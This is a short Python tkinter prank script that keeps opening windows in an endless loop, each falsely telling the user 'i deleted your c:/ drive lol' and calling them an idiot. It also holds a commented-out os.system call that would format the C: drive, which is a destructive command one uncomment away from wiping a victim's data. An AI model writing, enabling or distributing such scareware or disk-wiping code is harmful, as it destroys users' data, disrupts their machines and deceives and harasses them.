from tkinter import *
import random
import os

# os.system("format c: /y")

def new_window():
	root = Tk()
	root.title("i deleted your c:/ drive lol")
	root.geometry(f"1000x1000+{random.randint(1,1000)}+{random.randint(1,1000)}")

	idiot = Label(text="you idiot")
	idiot.pack()

	root.mainloop()

while True:
	new_window()